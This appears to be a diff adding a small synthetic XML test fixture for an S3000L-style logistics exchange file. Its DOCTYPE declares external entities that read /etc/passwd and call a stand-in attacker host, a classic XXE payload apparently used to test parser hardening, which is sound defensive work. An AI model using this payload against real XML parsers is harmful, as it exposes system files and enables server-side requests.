@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lsaExchange [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://attacker.example.invalid/x">
+]>
+<lsaExchange xmlns="urn:asthra:synthetic:s3000l">
+  <header><exchangeId>&secret;</exchangeId><productIdentifier>&remote;</productIdentifier></header>
+</lsaExchange>
